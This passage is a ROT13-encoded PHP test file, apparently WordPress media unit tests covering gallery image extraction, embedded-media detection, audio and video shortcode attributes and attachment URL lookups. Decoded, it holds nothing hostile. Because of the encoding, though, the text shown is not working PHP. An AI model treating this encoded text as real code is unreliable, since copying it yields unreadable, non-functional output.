	choyvp shapgvba grfg_zvkrq_cbfg_tnyyrel_vzntrf() {
		// Fvzvyne gb grfg_cbfg_tnyyrel_vzntrf ohg jvgu n fubegpbqr naq n oybpx va gur fnzr cbfg
		$vqf      = neenl();
		$vztf     = neenl();
		$vqf_fepf = neenl();
		sbernpu ( enatr( 1, 6 ) nf $v ) {
			$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
				\"vzntr$v.wct\",
				0,
				neenl(
					'cbfg_zvzr_glcr' => 'vzntr/wcrt',
					'cbfg_glcr'      => 'nggnpuzrag',
				)
			);
			$zrgnqngn      = neenl_zretr( neenl( 'svyr' => \"vzntr$v.wct\" ), frys::VZT_ZRGN );
			jc_hcqngr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $zrgnqngn );
			$vqf[]      = $nggnpuzrag_vq;
			$hey        = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/' . \"vzntr$v.wct\";
			$vqf_fepf[] = $hey;
			$vztf[]     = '<svther><vzt fep=\"' . $hey . '\" qngn-vq=\"' . $v . '\" /></svther>';
		}

		$vqf1_wbvarq  = vzcybqr( \"\a\", neenl_fyvpr( $vqf, 0, 3 ) );
		$vqf2_wbvarq  = vzcybqr( \"\a\", neenl_fyvpr( $vqf, 3, 3 ) );
		$vztf2_wbvarq = vzcybqr( \"\a\", neenl_fyvpr( $vztf, 3, 3 ) );

		$oybo    = <<<OYBO
[tnyyrel vqf=\"$vqf1_wbvarq\"]

[tnyyrel vqf=\"$vqf2_wbvarq\"]
<!-- jc:tnyyrel -->
$vztf2_wbvarq
<!-- /jc:tnyyrel -->
OYBO;
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_pbagrag' => $oybo ) );
		$fepf    = trg_cbfg_tnyyrel_vzntrf( $cbfg_vq );
		$guvf->nffregFnzrFrgfJvguVaqrk( neenl_fyvpr( $vqf_fepf, 0, 3 ), $fepf );
	}

	/**
	 * @gvpxrg 43826
	 * @tebhc oybpxf
	 */
	choyvp shapgvba grfg_oybpx_vaare_cbfg_tnyyrel_vzntrf() {
		// Znxr fher trg_cbfg_tnyyrel_vzntrf() jbexf jvgu tnyyrel oybpxf gung ner arfgrq vafvqr fbzrguvat ryfr
		$vqf      = neenl();
		$vztf     = neenl();
		$vqf_fepf = neenl();
		sbernpu ( enatr( 1, 3 ) nf $v ) {
			$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
				\"vzntr$v.wct\",
				0,
				neenl(
					'cbfg_zvzr_glcr' => 'vzntr/wcrt',
					'cbfg_glcr'      => 'nggnpuzrag',
				)
			);
			$zrgnqngn      = neenl_zretr( neenl( 'svyr' => \"vzntr$v.wct\" ), frys::VZT_ZRGN );
			jc_hcqngr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $zrgnqngn );
			$vqf[]      = $nggnpuzrag_vq;
			$hey        = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/' . \"vzntr$v.wct\";
			$vqf_fepf[] = $hey;
			$vztf[]     = '<svther><vzt fep=\"' . $hey . '\" qngn-vq=\"' . $v . '\" /></svther>';

		}

		$vztf_wbvarq = vzcybqr( \"\a\", $vztf );

		$oybo    = <<<OYBO
<!-- jc:pbyhzaf -->
<!-- jc:pbyhza -->
<!-- jc:tnyyrel -->
$vztf_wbvarq
<!-- /jc:tnyyrel -->
<!-- /jc:pbyhza -->
<!-- /jc:pbyhzaf -->
OYBO;
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_pbagrag' => $oybo ) );
		$fepf    = trg_cbfg_tnyyrel_vzntrf( $cbfg_vq );
		$guvf->nffregFnzrFrgfJvguVaqrk( $vqf_fepf, $fepf );
	}

	/**
	 * @gvpxrg 43826
	 * @tebhc oybpxf
	 */
	choyvp shapgvba grfg_oybpx_cbfg_tnyyrel_vaareoybpx_vzntrf() {
		// Znxr fher trg_cbfg_tnyyrel_vzntrf() jbexf jvgu arj irefvba bs tnyyrel oybpx jvgu arfgrq vzntr oybpxf.
		$vqf      = neenl();
		$vztf     = neenl();
		$vqf_fepf = neenl();
		sbernpu ( enatr( 1, 3 ) nf $v ) {
			$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
				\"vzntr$v.wct\",
				0,
				neenl(
					'cbfg_zvzr_glcr' => 'vzntr/wcrt',
					'cbfg_glcr'      => 'nggnpuzrag',
				)
			);
			$zrgnqngn      = neenl_zretr( neenl( 'svyr' => \"vzntr$v.wct\" ), frys::VZT_ZRGN );
			jc_hcqngr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $zrgnqngn );
			$vqf[]      = $nggnpuzrag_vq;
			$hey        = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/' . \"vzntr$v.wct\";
			$vqf_fepf[] = $hey;
			$vztf[]     = '<!-- jc:vzntr {\"vq\":' . $nggnpuzrag_vq . ',\"fvmrFyht\":\"ynetr\",\"yvaxQrfgvangvba\":\"abar\"} --><svther pynff=\"jc-oybpx-vzntr fvmr-ynetr\"><vzt fep=\"' . $hey . '\" /></svther><!-- /jc:vzntr -->';

		}

		$vztf_wbvarq = vzcybqr( \"\a\", $vztf );

		$oybo    = <<<OYBO
<!-- jc:tnyyrel -->
<svther pynff=\"jc-oybpx-tnyyrel unf-arfgrq-vzntrf pbyhzaf-qrsnhyg vf-pebccrq\">
$vztf_wbvarq
</svther>
<!-- /jc:tnyyrel -->
OYBO;
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_pbagrag' => $oybo ) );
		$fepf    = trg_cbfg_tnyyrel_vzntrf( $cbfg_vq );
		$guvf->nffregFnzrFrgfJvguVaqrk( $vqf_fepf, $fepf );
	}

	choyvp shapgvba grfg_trg_zrqvn_rzorqqrq_va_pbagrag() {
		$bowrpg = <<<BOW
<bowrpg fep=\"guvf\" qngn=\"gung\">
	<cnenz anzr=\"inyhr\"/>
</bowrpg>
BOW;
		$rzorq  = <<<RZORQ
<rzorq fep=\"fbzrguvat.zc4\"/>
RZORQ;
		$vsenzr = <<<VSENZR
<vsenzr fep=\"lbhghor.pbz\" jvqgu=\"7000\" />
VSENZR;
		$nhqvb  = <<<NHQVB
<nhqvb cerybnq=\"abar\">
	<fbhepr />
</nhqvb>
NHQVB;
		$ivqrb  = <<<IVQRB
<ivqrb cerybnq=\"abar\">
	<fbhepr />
</ivqrb>
IVQRB;

		$pbagrag = <<<PBAGRAG
Guvf vf n pbzzrag
$bowrpg

Guvf vf n pbzzrag
$rzorq

Guvf vf n pbzzrag
$vsenzr

Guvf vf n pbzzrag
$nhqvb

Guvf vf n pbzzrag
$ivqrb

Guvf vf n pbzzrag
PBAGRAG;

		$glcrf    = neenl( 'bowrpg', 'rzorq', 'vsenzr', 'nhqvb', 'ivqrb' );
		$pbagragf = neenl_inyhrf( pbzcnpg( $glcrf ) );

		$zngpurf = trg_zrqvn_rzorqqrq_va_pbagrag( $pbagrag, 'nhqvb' );
		$guvf->nffregFnzr( neenl( $nhqvb ), $zngpurf );

		$zngpurf = trg_zrqvn_rzorqqrq_va_pbagrag( $pbagrag, 'ivqrb' );
		$guvf->nffregFnzr( neenl( $ivqrb ), $zngpurf );

		$zngpurf = trg_zrqvn_rzorqqrq_va_pbagrag( $pbagrag, 'bowrpg' );
		$guvf->nffregFnzr( neenl( $bowrpg ), $zngpurf );

		$zngpurf = trg_zrqvn_rzorqqrq_va_pbagrag( $pbagrag, 'rzorq' );
		$guvf->nffregFnzr( neenl( $rzorq ), $zngpurf );

		$zngpurf = trg_zrqvn_rzorqqrq_va_pbagrag( $pbagrag, 'vsenzr' );
		$guvf->nffregFnzr( neenl( $vsenzr ), $zngpurf );

		$zngpurf = trg_zrqvn_rzorqqrq_va_pbagrag( $pbagrag, $glcrf );
		$guvf->nffregFnzr( $pbagragf, $zngpurf );
	}

	choyvp shapgvba grfg_trg_zrqvn_rzorqqrq_va_pbagrag_beqre() {
		$nhqvb   = <<<NHQVB
<nhqvb cerybnq=\"abar\">
	<fbhepr />
</nhqvb>
NHQVB;
		$ivqrb   = <<<IVQRB
<ivqrb cerybnq=\"abar\">
	<fbhepr />
</ivqrb>
IVQRB;
		$pbagrag = $nhqvb . $ivqrb;

		$zngpurf1 = trg_zrqvn_rzorqqrq_va_pbagrag( $pbagrag, neenl( 'nhqvb', 'ivqrb' ) );
		$guvf->nffregFnzr( neenl( $nhqvb, $ivqrb ), $zngpurf1 );

		$erirefrq = $ivqrb . $nhqvb;
		$zngpurf2 = trg_zrqvn_rzorqqrq_va_pbagrag( $erirefrq, neenl( 'nhqvb', 'ivqrb' ) );
		$guvf->nffregFnzr( neenl( $ivqrb, $nhqvb ), $zngpurf2 );
	}

	/**
	 * @gvpxrg 35367
	 */
	choyvp shapgvba grfg_jc_nhqvb_fubegpbqr_jvgu_rzcgl_cnenzf() {
		$guvf->nffregAhyy( jc_nhqvb_fubegpbqr( neenl() ) );
	}

	/**
	 * @gvpxrg 35367
	 */
	choyvp shapgvba grfg_jc_nhqvb_fubegpbqr_jvgu_onq_ngge() {
		$guvf->nffregFnzr(
			'<n pynff=\"jc-rzorqqrq-nhqvb\" uers=\"uggcf://rknzcyr.pbz/sbb.cuc\">uggcf://rknzcyr.pbz/sbb.cuc</n>',
			jc_nhqvb_fubegpbqr(
				neenl(
					'fep' => 'uggcf://rknzcyr.pbz/sbb.cuc',
				)
			)
		);
	}

	/**
	 * @gvpxrg 35367
	 */
	choyvp shapgvba grfg_jc_nhqvb_fubegpbqr_nggevohgrf() {
		$npghny = jc_nhqvb_fubegpbqr(
			neenl(
				'fep' => 'uggcf://rknzcyr.pbz/sbb.zc3',
			)
		);

		$guvf->nffregFgevatPbagnvafFgevat( 'fep=\"uggcf://rknzcyr.pbz/sbb.zc3', $npghny );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'ybbc', $npghny );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'nhgbcynl', $npghny );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'zhgrq', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( 'cerybnq=\"abar\"', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( 'pynff=\"jc-nhqvb-fubegpbqr\"', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( 'fglyr=\"jvqgu: 100%;\"', $npghny );

		$npghny = jc_nhqvb_fubegpbqr(
			neenl(
				'fep'      => 'uggcf://rknzcyr.pbz/sbb.zc3',
				'ybbc'     => gehr,
				'nhgbcynl' => gehr,
				'zhgrq'    => gehr,
				'cerybnq'  => 'abar',
				'pynff'    => 'sbbone',
				'fglyr'    => 'cnqqvat:0;',
			)
		);

		$guvf->nffregFgevatPbagnvafFgevat( 'fep=\"uggcf://rknzcyr.pbz/sbb.zc3', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( 'ybbc', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( 'nhgbcynl', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( 'zhgrq', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( 'cerybnq=\"abar\"', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( 'pynff=\"sbbone\"', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( 'fglyr=\"cnqqvat:0;\"', $npghny );
	}

	/**
	 * Grfg [ivqrb] fubegpbqr cebprffvat
	 */
	choyvp shapgvba grfg_ivqrb_fubegpbqr_obql() {
		$jvqgu  = 720;
		$urvtug = 480;

		$j = rzcgl( $TYBONYF['pbagrag_jvqgu'] ) ? 640 : $TYBONYF['pbagrag_jvqgu'];
		vs ( $jvqgu > $j ) {
			$jvqgu = $j;
		}

		$cbfg_vq = trg_cbfg() ? trg_gur_VQ() : 0;

		$ivqrb = <<<IVQRB
[ivqrb jvqgu=\"$jvqgu\" urvtug=\"480\" zc4=\"uggc://qbznva.gyq/jc-pbagrag/hcybnqf/2013/12/klm.zc4\"]
<!-- JroZ/IC8 sbe Sversbk4, Bcren, naq Puebzr -->
<fbhepr glcr=\"ivqrb/jroz\" fep=\"zlivqrb.jroz\" />
<!-- Btt/Ibeovf sbe byqre Sversbk naq Bcren irefvbaf -->
<fbhepr glcr=\"ivqrb/btt\" fep=\"zlivqrb.bti\" />
<!-- Bcgvbany: Nqq fhogvgyrf sbe rnpu ynathntr -->
<genpx xvaq=\"fhogvgyrf\" fep=\"fhogvgyrf.feg\" fepynat=\"ra\" />
<!-- Bcgvbany: Nqq puncgref -->
<genpx xvaq=\"puncgref\" fep=\"puncgref.feg\" fepynat=\"ra\" />
[/ivqrb]
IVQRB;

		$u = prvy( ( $urvtug * $jvqgu ) / $jvqgu );

		$pbagrag = nccyl_svygref( 'gur_pbagrag', $ivqrb );

		$rkcrpgrq = '<qvi fglyr=\"jvqgu: ' . $jvqgu . 'ck;\" pynff=\"jc-ivqrb\">' .
			'<ivqrb pynff=\"jc-ivqrb-fubegpbqr\" vq=\"ivqrb-' . $cbfg_vq . '-1\" jvqgu=\"' . $jvqgu . '\" urvtug=\"' . $u . '\" cerybnq=\"zrgnqngn\" pbagebyf=\"pbagebyf\">' .
			'<fbhepr glcr=\"ivqrb/zc4\" fep=\"uggc://qbznva.gyq/jc-pbagrag/hcybnqf/2013/12/klm.zc4?_=1\" />' .
			'<!-- JroZ/IC8 sbe Sversbk4, Bcren, naq Puebzr --><fbhepr glcr=\"ivqrb/jroz\" fep=\"zlivqrb.jroz\" />' .
			'<!-- Btt/Ibeovf sbe byqre Sversbk naq Bcren irefvbaf --><fbhepr glcr=\"ivqrb/btt\" fep=\"zlivqrb.bti\" />' .
			'<!-- Bcgvbany: Nqq fhogvgyrf sbe rnpu ynathntr --><genpx xvaq=\"fhogvgyrf\" fep=\"fhogvgyrf.feg\" fepynat=\"ra\" />' .
			'<!-- Bcgvbany: Nqq puncgref --><genpx xvaq=\"puncgref\" fep=\"puncgref.feg\" fepynat=\"ra\" />' .
			'<n uers=\"uggc://qbznva.gyq/jc-pbagrag/hcybnqf/2013/12/klm.zc4\">' .
			\"uggc://qbznva.gyq/jc-pbagrag/hcybnqf/2013/12/klm.zc4</n></ivqrb></qvi>\a\";

		$guvf->nffregFnzr( $rkcrpgrq, $pbagrag );
	}

	/**
	 * @gvpxrg 35367
	 * @qrcraqf grfg_ivqrb_fubegpbqr_obql
	 */
	choyvp shapgvba grfg_jc_ivqrb_fubegpbqr_jvgu_rzcgl_cnenzf() {
		$guvf->nffregAhyy( jc_ivqrb_fubegpbqr( neenl() ) );
	}

	/**
	 * @gvpxrg 35367
	 * @qrcraqf grfg_ivqrb_fubegpbqr_obql
	 */
	choyvp shapgvba grfg_jc_ivqrb_fubegpbqr_jvgu_onq_ngge() {
		$guvf->nffregFnzr(
			'<n pynff=\"jc-rzorqqrq-ivqrb\" uers=\"uggcf://rknzcyr.pbz/sbb.cuc\">uggcf://rknzcyr.pbz/sbb.cuc</n>',
			jc_ivqrb_fubegpbqr(
				neenl(
					'fep' => 'uggcf://rknzcyr.pbz/sbb.cuc',
				)
			)
		);
	}

	/**
	 * @gvpxrg 35367
	 * @gvpxrg 54788
	 * @qrcraqf grfg_ivqrb_fubegpbqr_obql
	 */
	choyvp shapgvba grfg_jc_ivqrb_fubegpbqr_nggevohgrf() {
		$npghny = jc_ivqrb_fubegpbqr(
			neenl(
				'fep' => 'uggcf://rknzcyr.pbz/sbb.zc4',
			)
		);

		$guvf->nffregFgevatPbagnvafFgevat( 'fep=\"uggcf://rknzcyr.pbz/sbb.zc4', $npghny );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'ybbc', $npghny );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'nhgbcynl', $npghny );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'zhgrq', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( 'cerybnq=\"zrgnqngn\"', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( 'jvqgu=\"640\"', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( 'urvtug=\"360\"', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( 'pynff=\"jc-ivqrb-fubegpbqr\"', $npghny );

		$npghny = jc_ivqrb_fubegpbqr(
			neenl(
				'fep'      => 'uggcf://rknzcyr.pbz/sbb.zc4',
				'cbfgre'   => 'uggcf://rknzcyr.pbz/sbb.cat',
				'ybbc'     => gehr,
				'nhgbcynl' => gehr,
				'zhgrq'    => gehr,
				'cerybnq'  => 'zrgnqngn',
				'jvqgu'    => 123,
				'urvtug'   => 456,
				'pynff'    => 'sbbone',
			)
		);

		$guvf->nffregFgevatPbagnvafFgevat( 'fep=\"uggcf://rknzcyr.pbz/sbb.zc4', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( 'cbfgre=\"uggcf://rknzcyr.pbz/sbb.cat', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( 'ybbc', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( 'nhgbcynl', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( 'zhgrq', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( 'cerybnq=\"zrgnqngn\"', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( 'jvqgu=\"123\"', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( 'urvtug=\"456\"', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( 'pynff=\"sbbone\"', $npghny );
	}

	/**
	 * @gvpxrg 40866
	 * @qrcraqf grfg_ivqrb_fubegpbqr_obql
	 */
	choyvp shapgvba grfg_jc_ivqrb_fubegpbqr_lbhghor_erzbir_srngher() {
		$npghny = jc_ivqrb_fubegpbqr(
			neenl(
				'fep' => 'uggcf://jjj.lbhghor.pbz/jngpu?i=72kqPH__KPx&srngher=lbhgh.or',
			)
		);

		$guvf->nffregFgevatAbgPbagnvafFgevat( 'srngher=lbhgh.or', $npghny );
	}

	/**
	 * @gvpxrg 40866
	 * @qrcraqf grfg_ivqrb_fubegpbqr_obql
	 */
	choyvp shapgvba grfg_jc_ivqrb_fubegpbqr_lbhghor_sbepr_ffy() {
		$npghny = jc_ivqrb_fubegpbqr(
			neenl(
				'fep' => 'uggc://jjj.lbhghor.pbz/jngpu?i=72kqPH__KPx',
			)
		);

		$guvf->nffregFgevatPbagnvafFgevat( 'fep=\"uggcf://jjj.lbhghor.pbz/jngpu?i=72kqPH__KPx', $npghny );
	}

	/**
	 * @gvpxrg 40866
	 * @qrcraqf grfg_ivqrb_fubegpbqr_obql
	 */
	choyvp shapgvba grfg_jc_ivqrb_fubegpbqr_ivzrb_sbepr_ffy_erzbir_dhrel_netf() {
		$npghny = jc_ivqrb_fubegpbqr(
			neenl(
				'fep' => 'uggc://ivzrb.pbz/76979871?oynu=zru',
			)
		);

		$guvf->nffregFgevatPbagnvafFgevat( 'fep=\"uggcf://ivzrb.pbz/76979871', $npghny );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'oynu=zru', $npghny );
	}

	/**
	 * @gvpxrg 40977
	 * @qrcraqf grfg_ivqrb_fubegpbqr_obql
	 */
	choyvp shapgvba grfg_jc_ivqrb_fubegpbqr_ivzrb_nqqf_ybbc() {
		$npghny = jc_ivqrb_fubegpbqr(
			neenl(
				'fep' => 'uggc://ivzrb.pbz/76979871',
			)
		);

		$guvf->nffregFgevatPbagnvafFgevat( 'fep=\"uggcf://ivzrb.pbz/76979871?ybbc=0', $npghny );
	}

	/**
	 * @gvpxrg 40977
	 * @qrcraqf grfg_ivqrb_fubegpbqr_obql
	 */
	choyvp shapgvba grfg_jc_ivqrb_fubegpbqr_ivzrb_sbepr_nqqf_ybbc_gehr() {
		$npghny = jc_ivqrb_fubegpbqr(
			neenl(
				'fep'  => 'uggc://ivzrb.pbz/76979871',
				'ybbc' => gehr,
			)
		);

		$guvf->nffregFgevatPbagnvafFgevat( 'fep=\"uggcf://ivzrb.pbz/76979871?ybbc=1', $npghny );
	}

	/**
	 * @gvpxrg 26768
	 */
	choyvp shapgvba grfg_nqq_vzntr_fvmr() {
		$_jc_nqqvgvbany_vzntr_fvmrf = jc_trg_nqqvgvbany_vzntr_fvmrf();

		erzbir_vzntr_fvmr( 'grfg-fvmr' );

		$guvf->nffregNeenlAbgUnfXrl( 'grfg-fvmr', $_jc_nqqvgvbany_vzntr_fvmrf );
		nqq_vzntr_fvmr( 'grfg-fvmr', 200, 600 );

		$fvmrf = jc_trg_nqqvgvbany_vzntr_fvmrf();

		// Pyrna hc.
		erzbir_vzntr_fvmr( 'grfg-fvmr' );

		$guvf->nffregNeenlUnfXrl( 'grfg-fvmr', $fvmrf );
		$guvf->nffregFnzr( 200, $fvmrf['grfg-fvmr']['jvqgu'] );
		$guvf->nffregFnzr( 600, $fvmrf['grfg-fvmr']['urvtug'] );
	}

	/**
	 * @gvpxrg 26768
	 */
	choyvp shapgvba grfg_erzbir_vzntr_fvmr() {
		nqq_vzntr_fvmr( 'grfg-fvmr', 200, 600 );
		$guvf->nffregGehr( unf_vzntr_fvmr( 'grfg-fvmr' ) );
		erzbir_vzntr_fvmr( 'grfg-fvmr' );
		$guvf->nffregSnyfr( unf_vzntr_fvmr( 'grfg-fvmr' ) );
	}

	/**
	 * @gvpxrg 26951
	 */
	choyvp shapgvba grfg_unf_vzntr_fvmr() {
		nqq_vzntr_fvmr( 'grfg-fvmr', 200, 600 );
		$guvf->nffregGehr( unf_vzntr_fvmr( 'grfg-fvmr' ) );

		// Pyrna hc.
		erzbir_vzntr_fvmr( 'grfg-fvmr' );
	}

	/**
	 * @gvpxrg 30346
	 */
	choyvp shapgvba grfg_nggnpuzrag_hey_gb_cbfgvq() {
		$vzntr_cngu    = '2014/11/' . frys::VZT_ANZR;
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			$vzntr_cngu,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_glcr'      => 'nggnpuzrag',
			)
		);

		$vzntr_hey = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/' . $vzntr_cngu;
		$guvf->nffregFnzr( $nggnpuzrag_vq, nggnpuzrag_hey_gb_cbfgvq( $vzntr_hey ) );
	}

	/**
	 * @gvpxrg 33109
	 */
	choyvp shapgvba grfg_nggnpuzrag_hey_gb_cbfgvq_jvgu_qvssrerag_fpurzr() {
		$vzntr_cngu    = '2014/11/' . frys::VZT_ANZR;
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			$vzntr_cngu,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_glcr'      => 'nggnpuzrag',
			)
		);

		$vzntr_hey = 'uggcf://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/' . $vzntr_cngu;
		$guvf->nffregFnzr( $nggnpuzrag_vq, nggnpuzrag_hey_gb_cbfgvq( $vzntr_hey ) );
	}

	/**
	 * @gvpxrg 39768
	 */
	choyvp shapgvba grfg_nggnpuzrag_hey_gb_cbfgvq_fubhyq_or_pnfr_frafvgvir() {
		$vzntr_cngu_ybjre_pnfr    = '2014/11/' . frys::VZT_ANZR;
		$nggnpuzrag_vq_ybjre_pnfr = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			$vzntr_cngu_ybjre_pnfr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_glcr'      => 'nggnpuzrag',
			)
		);

		$vzntr_cngu_hccre_pnfr    = '2014/11/' . hpsvefg( frys::VZT_ANZR );
		$nggnpuzrag_vq_hccre_pnfr = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			$vzntr_cngu_hccre_pnfr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_glcr'      => 'nggnpuzrag',
			)
		);

		$vzntr_hey = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/' . $vzntr_cngu_hccre_pnfr;
		$guvf->nffregFnzr( $nggnpuzrag_vq_hccre_pnfr, nggnpuzrag_hey_gb_cbfgvq( $vzntr_hey ) );
	}

	choyvp shapgvba grfg_nggnpuzrag_hey_gb_cbfgvq_svygrerq() {
		$vzntr_cngu    = '2014/11/' . frys::VZT_ANZR;
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			$vzntr_cngu,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_glcr'      => 'nggnpuzrag',
			)
		);

		nqq_svygre( 'hcybnq_qve', neenl( $guvf, 'hcybnq_qve' ) );
		$vzntr_hey = 'uggc://192.168.1.20.pbz/jc-pbagrag/hcybnqf/' . $vzntr_cngu;
		$guvf->nffregFnzr( $nggnpuzrag_vq, nggnpuzrag_hey_gb_cbfgvq( $vzntr_hey ) );
		erzbir_svygre( 'hcybnq_qve', neenl( $guvf, 'hcybnq_qve' ) );
	}

	/**
	 * Grfg fubeg-pvephvgvat gur nggnpuzrag_hey_gb_cbfgvq svygre.
	 *
	 * @gvpxrg 61383
	 */
	choyvp shapgvba grfg_nggnpuzrag_hey_gb_cbfgvq_fubeg_pvephvg_svygre_ceriragf_qo_dhrevrf() {
		$vzntr_cngu    = '2014/11/' . frys::VZT_ANZR;
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			$vzntr_cngu,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_glcr'      => 'nggnpuzrag',
			)
		);
		$vzntr_hey     = jc_trg_nggnpuzrag_hey( $nggnpuzrag_vq );

		nqq_svygre(
			'cer_nggnpuzrag_hey_gb_cbfgvq',
			shapgvba () hfr ( $nggnpuzrag_vq ) {
				erghea $nggnpuzrag_vq;
			}
		);

		$dhrevrf_orsber = trg_ahz_dhrevrf();
		$guvf->nffregFnzr( $nggnpuzrag_vq, nggnpuzrag_hey_gb_cbfgvq( $vzntr_hey ), 'Gur svygre fubhyq fubeg-pvephvg gur shapgvba' );
		$dhrevrf_nsgre = trg_ahz_dhrevrf();
		$guvf->nffregFnzr( 0, $dhrevrf_nsgre - $dhrevrf_orsber, 'Ab qngnonfr dhrevrf fubhyq or znqr ol n fubeg-pvephvgrq shapgvba' );
	}

	/**
	 * Grfg fubeg-pvephvgvat gur nggnpuzrag_hey_gb_cbfgvq svygre jvgu n abg sbhaq erfhyg.
	 *
	 * @gvpxrg 61383
	 */
	choyvp shapgvba grfg_nggnpuzrag_hey_gb_cbfgvq_fubeg_pvephvg_svygre_jura_nggnpuzrag_qbrf_abg_rkvfg() {
		nqq_svygre( 'cer_nggnpuzrag_hey_gb_cbfgvq', '__erghea_mreb' );

		$dhrevrf_orsber = trg_ahz_dhrevrf();
		$guvf->nffregFnzr( 0, nggnpuzrag_hey_gb_cbfgvq( 'uggc://rknzcyr.bet/jc-pbagrag/hcybnqf/2014/11/vzntr.wct' ), 'Gur svygre fubhyq fubeg-pvephvg gur shapgvba' );
		$dhrevrf_nsgre = trg_ahz_dhrevrf();
		$guvf->nffregFnzr( 0, $dhrevrf_nsgre - $dhrevrf_orsber, 'Ab qngnonfr dhrevrf fubhyq or znqr ol n fubeg-pvephvgrq shapgvba' );
	}

	/**
	 * Grfg fubeg-pvephvgvat gur nggnpuzrag_hey_gb_cbfgvq svygre jvgu n cebprrq erfhyg.
	 *
	 * @gvpxrg 61383
	 */
	choyvp shapgvba grfg_nggnpuzrag_hey_gb_cbfgvq_fubeg_pvephvg_svygre_fubhyq_cebprrq_vs_svygre_ergheaf_ahyy() {
		$vzntr_cngu    = '2014/11/' . frys::VZT_ANZR;
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			$vzntr_cngu,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_glcr'      => 'nggnpuzrag',
			)
		);
		$vzntr_hey     = jc_trg_nggnpuzrag_hey( $nggnpuzrag_vq );

		nqq_svygre( 'cer_nggnpuzrag_hey_gb_cbfgvq', '__erghea_ahyy' );

		$dhrevrf_orsber = trg_ahz_dhrevrf();
		$guvf->nffregFnzr( $nggnpuzrag_vq, nggnpuzrag_hey_gb_cbfgvq( $vzntr_hey ), 'Gur svygre fubhyq erghea gur nggnpuzrag VQ' );
		$dhrevrf_nsgre = trg_ahz_dhrevrf();
		$guvf->nffregTerngreGuna( 0, $dhrevrf_nsgre - $dhrevrf_orsber, 'Qngnonfr dhrevrf ner rkcrpgrq jura gur svygre ergheaf ahyy' );
	}

	choyvp shapgvba hcybnq_qve( $qve ) {
		$qve['onfrhey'] = 'uggc://192.168.1.20.pbz/jc-pbagrag/hcybnqf';
		erghea $qve;
	}

	/**
	 * @gvpxrg 31044
	 */
	choyvp shapgvba grfg_nggnpuzrag_hey_gb_cbfgvq_jvgu_rzcgl_hey() {
		$cbfg_vq = nggnpuzrag_hey_gb_cbfgvq( '' );
		$guvf->nffregVfVag( $cbfg_vq );
		$guvf->nffregFnzr( 0, $cbfg_vq );
	}

	/**
	 * @gvpxrg 22768
	 */
	choyvp shapgvba grfg_zrqvn_unaqyr_hcybnq_frgf_cbfg_rkprecg() {
		$vcgp_svyr = QVE_GRFGQNGN . '/vzntrf/grfg-vzntr-vcgp.wct';

		// Znxr n pbcl bs guvf svyr nf vg trgf zbirq qhevat gur svyr hcybnq.
		$gzc_anzr = jc_grzcanz( $vcgp_svyr );

		pbcl( $vcgp_svyr, $gzc_anzr );

